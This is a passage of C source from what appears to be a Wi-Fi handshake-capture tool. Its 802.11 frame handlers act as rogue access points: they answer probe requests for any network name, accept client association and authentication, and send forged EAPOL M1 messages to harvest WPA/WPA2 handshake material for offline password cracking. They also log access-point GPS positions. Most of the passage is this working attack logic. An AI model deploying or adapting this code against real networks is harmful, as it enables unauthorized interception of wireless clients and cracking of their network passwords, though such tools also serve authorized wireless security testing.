	if((pcapngframesout &PCAPNG_FRAME_WEP) == PCAPNG_FRAME_WEP) writeepb(fd_pcapng);
	}
return;
}
/*===========================================================================*/
static inline void process80211data_wpa()
{
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_WPA) == PCAPNG_FRAME_WPA) writeepb(fd_pcapng);
	}
}
/*===========================================================================*/
static inline void process80211rts()
{
static macessidlist_t *zeiger;

for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->ap, macfrx->addr1, 6) != 0) continue;
	if((zeiger->status &FILTERED) == FILTERED) return;
	zeiger->timestamp = timestamp;
	if(memcmp(&mac_null, zeiger->client, 6) == 0) zeiger->count = 0;
	memcpy(zeiger->client, macfrx->addr2, 6);
	return;
	}
for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) return;
	if(memcmp(zeiger->ap, macfrx->addr2, 6) != 0) continue;
	if((zeiger->status &FILTERED) == FILTERED) return;
	zeiger->timestamp = timestamp;
	if(memcmp(&mac_null, zeiger->client, 6) == 0) zeiger->count = 0;
	memcpy(zeiger->client, macfrx->addr1, 6);
	return;
	}
return;
}
/*===========================================================================*/
static inline void process80211blockack_req()
{
static macessidlist_t *zeiger;

for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->ap, macfrx->addr1, 6) != 0) continue;
	if((zeiger->status &FILTERED) == FILTERED) return;
	zeiger->timestamp = timestamp;
	if(memcmp(&mac_null, zeiger->client, 6) == 0) zeiger->count = 0;
	memcpy(zeiger->client, macfrx->addr2, 6);
	return;
	}
for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) return;
	if(memcmp(zeiger->ap, macfrx->addr2, 6) != 0) continue;
	if((zeiger->status &FILTERED) == FILTERED) return;
	zeiger->timestamp = timestamp;
	if(memcmp(&mac_null, zeiger->client, 6) == 0) zeiger->count = 0;
	memcpy(zeiger->client, macfrx->addr1, 6);
	return;
	}
return;
}
/*===========================================================================*/
static inline void process80211blockack()
{
static macessidlist_t *zeiger;

for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->ap, macfrx->addr1, 6) != 0) continue;
	if((zeiger->status &FILTERED) == FILTERED) return;
	zeiger->timestamp = timestamp;
	if(memcmp(&mac_null, zeiger->client, 6) == 0) zeiger->count = 0;
	memcpy(zeiger->client, macfrx->addr2, 6);
	return;
	}
for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) return;
	if(memcmp(zeiger->ap, macfrx->addr2, 6) != 0) continue;
	if((zeiger->status &FILTERED) == FILTERED) return;
	zeiger->timestamp = timestamp;
	if(memcmp(&mac_null, zeiger->client, 6) == 0) zeiger->count = 0;
	memcpy(zeiger->client, macfrx->addr1, 6);
	return;
	}
return;
}
/*===========================================================================*/
static inline void process80211powersave_poll()
{
static macessidlist_t *zeiger;

if((macfrx->to_ds == 1) && (macfrx->from_ds == 0))
	{
	for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
		{
		if(zeiger->timestamp == 0) break;
		if(memcmp(zeiger->ap, macfrx->addr1, 6) != 0) continue;
		if((zeiger->status &FILTERED) == FILTERED) return;
		zeiger->timestamp = timestamp;
		if(memcmp(&mac_null, zeiger->client, 6) == 0) zeiger->count = 0;
		memcpy(zeiger->client, macfrx->addr2, 6);
		return;
		}
	}
return;
}
/*===========================================================================*/
static inline void process80211action()
{
static actf_t *actf;

if(payloadlen < ACTIONFRAME_SIZE) return;
actf = (actf_t*)payloadptr;
if(actf->categoriecode == CAT_VENDOR)
	{
	if(fd_pcapng > 0)
		{
		if((pcapngframesout &PCAPNG_FRAME_VENDOR) == PCAPNG_FRAME_VENDOR) writeepb(fd_pcapng);
		}
	return;
	}
if((timestamp -lastauthtimestamp) > eapoltimeoutvalue) return;
if(memcmp(&lastauthap, macfrx->addr1, 6) != 0) return;
send_ack();
if(lastauthkeyver == 2) send_m1_wpa2();
else if(lastauthkeyver == 1) send_m1_wpa1();
return;
}
/*===========================================================================*/
static inline void process80211ack()
{
if((timestamp -lastauthtimestamp) > eapoltimeoutvalue) return;
if(memcmp(&lastauthap, macfrx->addr1, 6) != 0) return;
send_ack();
if(lastauthkeyver == 2) send_m1_wpa2();
else if(lastauthkeyver == 1) send_m1_wpa1();
return;
}
/*===========================================================================*/
static inline void process80211null()
{
static macessidlist_t *zeiger;

if((macfrx->to_ds == 0) && (macfrx->from_ds == 1))
	{
	for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
		{
		if(zeiger->timestamp == 0) break;
		if(memcmp(zeiger->ap, macfrx->addr2, 6) != 0) continue;
		if((zeiger->status &FILTERED) == FILTERED) return;
		if(memcmp(&mac_null, zeiger->client, 6) == 0) zeiger->count = 0;
		memcpy(zeiger->client, macfrx->addr1, 6);
		return;
		}
	return;
	}
if((macfrx->to_ds == 1) && (macfrx->from_ds == 0))
	{
	if((timestamp -lastauthtimestamp) <= eapoltimeoutvalue)
		{
		if(memcmp(&lastauthap, macfrx->addr1, 6) == 0)
			{
			send_ack();
			if(lastauthkeyver == 2) send_m1_wpa2();
			else if(lastauthkeyver == 1) send_m1_wpa1();
			return;
			}
		}
	for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
		{
		if(zeiger->timestamp == 0) break;
		if(memcmp(zeiger->ap, macfrx->addr1, 6) != 0) continue;
		if((zeiger->status &FILTERED) == FILTERED) return;
		zeiger->timestamp = timestamp;
		if(memcmp(&mac_null, zeiger->client, 6) == 0) zeiger->count = 0;
		memcpy(zeiger->client, macfrx->addr2, 6);
		return;
		}
	}
return;
}
/*===========================================================================*/
static inline void process80211qosnull()
{
static macessidlist_t *zeiger;

if((macfrx->to_ds == 0) && (macfrx->from_ds == 1))
	{
	memset(&lastauthap, 0, 6);
	memset(&lastauthclient, 0, 6);
	lastauthtimestamp = 0;
	for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
		{
		if(zeiger->timestamp == 0) break;
		if(memcmp(zeiger->ap, macfrx->addr2, 6) != 0) continue;
		if((zeiger->status &FILTERED) == FILTERED) return;
		if(memcmp(&mac_null, zeiger->client, 6) == 0) zeiger->count = 0;
		memcpy(zeiger->client, macfrx->addr1, 6);
		return;
		}
	return;
	}
if((macfrx->to_ds == 1) && (macfrx->from_ds == 0))
	{
	if((memcmp(&lastauthap, macfrx->addr1, 6) == 0) && ((timestamp -lastauthtimestamp) <= eapoltimeoutvalue))
		{
		send_ack();
		if(lastauthkeyver == 2) send_m1_wpa2();
		else if(lastauthkeyver == 1) send_m1_wpa1();
		return;
		}
	for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
		{
		if(zeiger->timestamp == 0) break;
		if(memcmp(zeiger->ap, macfrx->addr1, 6) != 0) continue;
		if((zeiger->status &FILTERED) == FILTERED) return;
		zeiger->timestamp = timestamp;
		if(memcmp(&mac_null, zeiger->client, 6) == 0) zeiger->count = 0;
		memcpy(zeiger->client, macfrx->addr2, 6);
		return;
		}
	}
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void process80211reassociation_resp()
{
static macessidlist_t *zeiger;

if(payloadlen < ASSOCIATIONRESPFRAME_SIZE) return;
for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->ap, macfrx->addr2, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	if((zeiger->status &FILTERED) == FILTERED) return;
	if((zeiger->status &AP_REASSOC_RESP) != AP_REASSOC_RESP)
		{
		zeiger->status |= AP_REASSOC_RESP;
		if(fd_pcapng > 0)
			{
			if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
			}
		if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
		}
	return;
	}
memset(zeiger, 0, MACESSIDLIST_SIZE);
zeiger->timestamp = timestamp;
zeiger->status = AP_REASSOC_RESP;
memcpy(zeiger->ap, macfrx->addr2, 6);
if(filtermode != 0)
	{
	if(setapfilter(zeiger) == true)
		{
		qsort(aplist, zeiger -aplist +1, MACESSIDLIST_SIZE, sort_macessidlist_by_time);
		return;
		}
	}
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
qsort(aplist, zeiger -aplist +1, MACESSIDLIST_SIZE, sort_macessidlist_by_time);
return;
}
/*===========================================================================*/
static inline void process80211reassociation_req()
{
static uint8_t *clientinfoptr;
static uint16_t clientinfolen;
static ownlist_t *zeiger;
static tags_t tags;

clientinfoptr = payloadptr +CAPABILITIESREQSTA_SIZE;
clientinfolen = payloadlen -CAPABILITIESREQSTA_SIZE;
if(clientinfolen < IETAG_SIZE) return;
for(zeiger = ownlist; zeiger < ownlist +OWNLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if((memcmp(zeiger->ap, macfrx->addr1, 6) != 0) && (memcmp(zeiger->client, macfrx->addr2, 6) != 0)) continue;
	zeiger->timestamp = timestamp;
	gettags(clientinfolen, clientinfoptr, &tags);
	if((tags.essidlen != 0) && (tags.essid[0] != 0))
		{
		zeiger->essidlen = tags.essidlen;
		memcpy(zeiger->essid, tags.essid, tags.essidlen);
		}
	if(zeiger->status >= OW_M2M3) return;
	if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS)
		{
		if(((tags.akm &TAK_PSK) == TAK_PSK) || ((tags.akm &TAK_PSKSHA256) == TAK_PSKSHA256))
			{
			if((tags.kdversion &KV_RSNIE) == KV_RSNIE)
				{
				send_ack();
				send_reassociation_resp();
				memcpy(&lastauthap, macfrx->addr1, 6);
				memcpy(&lastauthclient, macfrx->addr2, 6);
				lastauthtimestamp = timestamp;
				lastauthkeyver = 2;
				}
			else if((tags.kdversion &KV_WPAIE) == KV_WPAIE)
				{
				send_ack();
				send_reassociation_resp();
				memcpy(&lastauthap, macfrx->addr1, 6);
				memcpy(&lastauthclient, macfrx->addr2, 6);
				lastauthtimestamp = timestamp;
				lastauthkeyver = 1;
				}
			}
		}
	if((zeiger->status &OW_REASSOC) != OW_REASSOC)
		{
		zeiger->status |= OW_REASSOC;
		gettags(clientinfolen, clientinfoptr, &tags);
		zeiger->timestamp = timestamp;
		if(fd_pcapng > 0)
			{
			if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
			}
		if((statusout &STATUS_ASSOCIATION) == STATUS_ASSOCIATION) printown(zeiger, "REASSOCIATION");
		}
	return;
	}
memset(zeiger, 0, OWNLIST_SIZE);
gettags(clientinfolen, clientinfoptr, &tags);
zeiger->timestamp = timestamp;
zeiger->status = OW_REASSOC;
memcpy(zeiger->ap, macfrx->addr1, 6);
memcpy(zeiger->client, macfrx->addr2, 6);
zeiger->essidlen = tags.essidlen;
memcpy(zeiger->essid, tags.essid, tags.essidlen);
if(filtermode != 0)
	{
	if(setclientfilter(zeiger) == true)
		{
		qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
		return;
		}
	}
if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS)
	{
	if(((tags.akm &TAK_PSK) == TAK_PSK) || ((tags.akm &TAK_PSKSHA256) == TAK_PSKSHA256))
		{
		if((tags.kdversion &KV_RSNIE) == KV_RSNIE)
			{
			send_ack();
			send_reassociation_resp();
			memcpy(&lastauthap, macfrx->addr1, 6);
			memcpy(&lastauthclient, macfrx->addr2, 6);
			lastauthtimestamp = timestamp;
			lastauthkeyver = 2;
			}
		else if((tags.kdversion &KV_WPAIE) == KV_WPAIE)
			{
			send_ack();
			send_reassociation_resp();
			memcpy(&lastauthap, macfrx->addr1, 6);
			memcpy(&lastauthclient, macfrx->addr2, 6);
			lastauthtimestamp = timestamp;
			lastauthkeyver = 1;
			}
		}
	}
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
if((statusout &STATUS_ASSOCIATION) == STATUS_ASSOCIATION) printown(zeiger, "REASSOCIATION");
qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void process80211association_resp()
{
static macessidlist_t *zeiger;

if(memcmp(&mac_myclient, macfrx->addr1, 6) == 0) send_ack();
if(payloadlen < ASSOCIATIONRESPFRAME_SIZE) return;
for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->ap, macfrx->addr2, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	if((zeiger->status &FILTERED) == FILTERED) return;
	if((zeiger->status &AP_ASSOC_RESP) != AP_ASSOC_RESP)
		{
		zeiger->status |= AP_ASSOC_RESP;
		if(fd_pcapng > 0)
			{
			if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
			}
		if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
		}
	return;
	}
memset(zeiger, 0, MACESSIDLIST_SIZE);
zeiger->timestamp = timestamp;
zeiger->status = AP_ASSOC_RESP;
memcpy(zeiger->ap, macfrx->addr2, 6);
if(filtermode != 0)
	{
	if(setapfilter(zeiger) == true)
		{
		qsort(aplist, zeiger -aplist +1, MACESSIDLIST_SIZE, sort_macessidlist_by_time);
		return;
		}
	}
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
qsort(aplist, zeiger -aplist +1, MACESSIDLIST_SIZE, sort_macessidlist_by_time);
return;
}
/*===========================================================================*/
static inline void process80211association_req()
{
static uint8_t *clientinfoptr;
static uint16_t clientinfolen;
static ownlist_t *zeiger;
static tags_t tags;

clientinfoptr = payloadptr +CAPABILITIESSTA_SIZE;
clientinfolen = payloadlen -CAPABILITIESSTA_SIZE;
if(clientinfolen < IETAG_SIZE) return;
for(zeiger = ownlist; zeiger < ownlist +OWNLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if((memcmp(zeiger->ap, macfrx->addr1, 6) != 0) && (memcmp(zeiger->client, macfrx->addr2, 6) != 0)) continue;
	zeiger->timestamp = timestamp;
	gettags(clientinfolen, clientinfoptr, &tags);
	if((tags.essidlen != 0) && (tags.essid[0] != 0))
		{
		zeiger->essidlen = tags.essidlen;
		memcpy(zeiger->essid, tags.essid, tags.essidlen);
		}
	if(zeiger->status >= OW_M1M2ROGUE) return;
	if(((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS) && (zeiger->status < OW_M1M2ROGUE))
		{
		if(((tags.akm &TAK_PSK) == TAK_PSK) || ((tags.akm &TAK_PSKSHA256) == TAK_PSKSHA256))
			{
			if((tags.kdversion &KV_RSNIE) == KV_RSNIE)
				{
				send_ack();
				send_association_resp();
				memcpy(&lastauthap, macfrx->addr1, 6);
				memcpy(&lastauthclient, macfrx->addr2, 6);
				lastauthtimestamp = timestamp;
				lastauthkeyver = 2;
				}
			else if((tags.kdversion &KV_WPAIE) == KV_WPAIE)
				{
				send_ack();
				send_association_resp();
				memcpy(&lastauthap, macfrx->addr1,6);
				memcpy(&lastauthclient, macfrx->addr2,6);
				lastauthtimestamp = timestamp;
				lastauthkeyver = 1;
				}
			}
		}
	if((zeiger->status &OW_ASSOC) != OW_ASSOC)
		{
		zeiger->status |= OW_ASSOC;
		gettags(clientinfolen, clientinfoptr, &tags);
		zeiger->timestamp = timestamp;
		zeiger->essidlen = tags.essidlen;
		memcpy(zeiger->essid, tags.essid, tags.essidlen);
		if(fd_pcapng > 0)
			{
			if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
			}
		if((statusout &STATUS_ASSOCIATION) == STATUS_ASSOCIATION) printown(zeiger, "ASSOCIATION");
		}
	return;
	}
memset(zeiger, 0, OWNLIST_SIZE);
gettags(clientinfolen, clientinfoptr, &tags);
zeiger->timestamp = timestamp;
zeiger->status = OW_ASSOC;
memcpy(zeiger->ap, macfrx->addr1, 6);
memcpy(zeiger->client, macfrx->addr2, 6);
zeiger->essidlen = tags.essidlen;
memcpy(zeiger->essid, tags.essid, tags.essidlen);
if(filtermode != 0)
	{
	if(setclientfilter(zeiger) == true)
		{
		qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
		return;
		}
	}
if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS)
	{
	if(((tags.akm &TAK_PSK) == TAK_PSK) || ((tags.akm &TAK_PSKSHA256) == TAK_PSKSHA256))
		{
		if((tags.kdversion &KV_RSNIE) == KV_RSNIE)
			{
			send_ack();
			send_association_resp();
			memcpy(&lastauthap, macfrx->addr1, 6);
			memcpy(&lastauthclient, macfrx->addr2, 6);
			lastauthtimestamp = timestamp;
			lastauthkeyver = 2;
			}
		else if((tags.kdversion &KV_WPAIE) == KV_WPAIE)
			{
			send_ack();
			send_association_resp();
			memcpy(&lastauthap, macfrx->addr1, 6);
			memcpy(&lastauthclient, macfrx->addr2, 6);
			lastauthtimestamp = timestamp;
			lastauthkeyver = 1;
			}
		}
	}
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
if((statusout &STATUS_ASSOCIATION) == STATUS_ASSOCIATION) printown(zeiger, "ASSOCIATION");
qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void process80211authentication_resp()
{
static authf_t *auth;
static macessidlist_t *zeiger;

auth = (authf_t*)payloadptr;
if(payloadlen < AUTHENTICATIONFRAME_SIZE) return;
for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) return;
	zeiger->timestamp = timestamp;
	if((zeiger->status &FILTERED) == FILTERED) return;
	if(memcmp(zeiger->ap, macfrx->addr2, 6) != 0) continue;
	if((zeiger->essidlen != 0) && (zeiger->essid[0] != 0) && (auth->algorithm == OPEN_SYSTEM) && (memcmp(&mac_myclient, macfrx->addr1, 6) == 0))
		{
		send_ack();
		if((zeiger->kdversion &KV_RSNIE) == KV_RSNIE) send_association_req_wpa2(zeiger);
		else if((zeiger->kdversion &KV_WPAIE) == KV_WPAIE) send_association_req_wpa1(zeiger);
		}
	if((zeiger->status &AP_AUTH_RESP) != AP_AUTH_RESP)
		{
		zeiger->status |= AP_AUTH_RESP;
		if(fd_pcapng > 0)
			{
			if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
			}
		if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
		}
	return;
	}
memset(zeiger, 0, MACESSIDLIST_SIZE);
zeiger->timestamp = timestamp;
zeiger->status = AP_AUTH_RESP;
memcpy(zeiger->ap, macfrx->addr2, 6);
if(filtermode != 0)
	{
	if(setapfilter(zeiger) == true)
		{
		qsort(aplist, zeiger -aplist +1, MACESSIDLIST_SIZE, sort_macessidlist_by_time);
		return;
		}
	}
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
qsort(aplist, zeiger -aplist +1, MACESSIDLIST_SIZE, sort_macessidlist_by_time);
return;
}
/*===========================================================================*/
static inline void process80211authentication_req()
{
static authf_t *auth;
static ownlist_t *zeiger;

auth = (authf_t*)payloadptr;
if(payloadlen < AUTHENTICATIONFRAME_SIZE) return;
for(zeiger = ownlist; zeiger < ownlist +OWNLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if((memcmp(zeiger->ap, macfrx->addr1, 6) != 0) && (memcmp(zeiger->client, macfrx->addr2, 6) != 0)) continue;
	zeiger->timestamp = timestamp;
	if((zeiger->status &FILTERED) == FILTERED) return;
	if(((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS) && (zeiger->status < OW_M1M2ROGUE))
		{
		if(auth->algorithm == OPEN_SYSTEM)
			{
			send_ack();
			send_authentication_resp_opensystem();
			}
		}
	if((zeiger->status &OW_AUTH) != OW_AUTH)
		{
		zeiger->status |= OW_AUTH;
		if(fd_pcapng > 0)
			{
			if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
			}
		if((statusout &STATUS_AUTHENTICATION) == STATUS_AUTHENTICATION) printown(zeiger, "AUTHENTICATION");
		}
	return;
	}
memset(zeiger, 0, OWNLIST_SIZE);
zeiger->timestamp = timestamp;
zeiger->status = OW_AUTH;
memcpy(zeiger->ap, macfrx->addr1, 6);
memcpy(zeiger->client, macfrx->addr2, 6);
if(filtermode != 0)
	{
	if(setclientfilter(zeiger) == true)
		{
		qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
		return;
		}
	}
if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS)
	{
	if(auth->algorithm == OPEN_SYSTEM)
		{
		send_ack();
		send_authentication_resp_opensystem();
		}
	}
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
if((statusout &STATUS_AUTHENTICATION) == STATUS_AUTHENTICATION) printown(zeiger, "AUTHENTICATION");
qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void process80211probe_req_directed()
{
static macessidlist_t *zeiger;
static tags_t tags;

if(memcmp(&mac_myapopen, macfrx->addr1, 6) == 0)
	{
	if((attackstatus &SILENT) != SILENT) send_probe_resp_open();
	}
if(payloadlen < IETAG_SIZE) return;
gettags(payloadlen, payloadptr, &tags);
if((tags.essidlen == 0) || (tags.essid[0] == 0)) return;
for(zeiger = rglist; zeiger < rglist +RGLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->ap, macfrx->addr1, 6) != 0) continue;
	if(zeiger->essidlen != tags.essidlen) continue;
	if(memcmp(zeiger->essid, tags.essid, tags.essidlen) != 0) continue;
	zeiger->timestamp = timestamp;
	if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS) send_probe_resp(macfrx->addr2, zeiger);
	return;
	}
memset(zeiger, 0, MACESSIDLIST_SIZE);
zeiger->timestamp = timestamp;
memcpy(zeiger->ap, macfrx->addr1, 6);
zeiger->essidlen = tags.essidlen;
memcpy(zeiger->essid, tags.essid, tags.essidlen);
if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS) send_probe_resp(macfrx->addr2, zeiger);
memcpy(&mac_myprclient, macfrx->addr2, 6);
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
if((statusout &STATUS_ROGUE) == STATUS_ROGUE) printstatusap(macfrx->addr2, zeiger, "ROGUE PROBEREQPONSE");
qsort(rglist, zeiger -rglist +1, MACESSIDLIST_SIZE, sort_macessidlist_by_time);
return;
}
/*===========================================================================*/
static inline void process80211probe_req()
{
static macessidlist_t *zeiger;
static tags_t tags;

if(payloadlen < IETAG_SIZE) return;
gettags(payloadlen, payloadptr, &tags);
if((tags.essidlen == 0) || (tags.essid[0] == 0)) return;
for(zeiger = rglist; zeiger < rglist +RGLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(zeiger->essidlen != tags.essidlen) continue;
	if(memcmp(zeiger->essid, tags.essid, tags.essidlen) != 0) continue;
	zeiger->timestamp = timestamp;
	if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS) send_probe_resp(macfrx->addr2, zeiger);
	return;
	}
memset(zeiger, 0, MACESSIDLIST_SIZE);
zeiger->timestamp = timestamp;
memcpy(zeiger->ap, &mac_myap, 3);
zeiger->ap[3] = (mynic_ap >> 16) & 0xff;
zeiger->ap[4] = (mynic_ap >> 8) & 0xff;
zeiger->ap[5] = mynic_ap & 0xff;
mynic_ap++;
zeiger->essidlen = tags.essidlen;
memcpy(zeiger->essid, tags.essid, tags.essidlen);
if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS) send_probe_resp(macfrx->addr2, zeiger);
memcpy(&mac_myprclient, macfrx->addr2, 6);
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
if((statusout &STATUS_ROGUE) == STATUS_ROGUE) printstatusap(macfrx->addr2, zeiger, "ROGUE PROBERESPONSE");
qsort(rglist, zeiger -rglist +1, MACESSIDLIST_SIZE, sort_macessidlist_by_time);
return;
}
/*===========================================================================*/
static inline void process80211probe_resp()
{
static int apinfolen;
static uint8_t *apinfoptr;
static macessidlist_t *zeiger;
static tags_t tags;

if(payloadlen < CAPABILITIESAP_SIZE +IETAG_SIZE) return;
apinfoptr = payloadptr +CAPABILITIESAP_SIZE;
apinfolen = payloadlen -CAPABILITIESAP_SIZE;
for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->ap, macfrx->addr2, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	if((zeiger->status &FILTERED) == FILTERED) return;
	if((zeiger->essidlen == 0) || (zeiger->essid[0] == 0))
		{
		gettags(apinfolen, apinfoptr, &tags);
		if((tags.essidlen == 0) || (tags.essid[0] == 0)) return;
		zeiger->timestamp = timestamp;
		memcpy(zeiger->ap, macfrx->addr2, 6);
		if(tags.channel != 0) zeiger->channel = tags.channel;
		else zeiger->channel = channelscanlist[cpa];
		zeiger->kdversion = tags.kdversion;
		zeiger->groupcipher = tags.groupcipher;
		zeiger->cipher = tags.cipher;
		zeiger->akm = tags.akm;
		zeiger->essidlen = tags.essidlen;
		memcpy(zeiger->essid, tags.essid, tags.essidlen);
		}
	if((zeiger->status &AP_PROBE_RESP) != AP_PROBE_RESP)
		{
		zeiger->status |= AP_PROBE_RESP;
		if(fd_pcapng > 0)
			{
			if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
			}
		if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
		if((statusout &STATUS_AP_BEACON_PROBE) == STATUS_AP_BEACON_PROBE) printstatusap(macfrx->addr1, zeiger, "PROBERESPONSE");
		}
	return;
	}
memset(zeiger, 0, MACESSIDLIST_SIZE);
gettags(apinfolen, apinfoptr, &tags);
zeiger->timestamp = timestamp;
zeiger->status = AP_PROBE_RESP;
memcpy(zeiger->ap, macfrx->addr2, 6);
if(tags.channel != 0) zeiger->channel = tags.channel;
else zeiger->channel = channelscanlist[cpa];
zeiger->kdversion = tags.kdversion;
zeiger->groupcipher = tags.groupcipher;
zeiger->cipher = tags.cipher;
zeiger->akm = tags.akm;
zeiger->essidlen = tags.essidlen;
memcpy(zeiger->essid, tags.essid, tags.essidlen);
if(filtermode != 0)
	{
	if(setapfilter(zeiger) == true)
		{
		qsort(aplist, zeiger -aplist +1, MACESSIDLIST_SIZE, sort_macessidlist_by_time);
		return;
		}
	}
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
if((statusout &STATUS_AP_BEACON_PROBE) == STATUS_AP_BEACON_PROBE) printstatusap(macfrx->addr1, zeiger, "PROBERESPONSE");
qsort(aplist, zeiger -aplist +1, MACESSIDLIST_SIZE, sort_macessidlist_by_time);
return;
}
/*===========================================================================*/
static inline void processpagid(uint8_t *pagidptr)
{
static pagidlist_t *zeiger;
static char timestring[16];

for(zeiger = pagidlist; zeiger < pagidlist +PAGIDLIST_MAX -1; zeiger++)
	{
	if(zeiger->id[0] == 0) break;
	if(memcmp(zeiger->id, pagidptr, 64) == 0) return;
	}
zeiger->timestamp = timestamp;
memcpy(zeiger->id, pagidptr, 64);
if(((statusout &STATUS_AP_BEACON_PROBE) == STATUS_AP_BEACON_PROBE) || ((statusout &STATUS_ROGUE) == STATUS_ROGUE) || ((statusout &STATUS_ASSOCIATION) == STATUS_ASSOCIATION))
	{
	strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
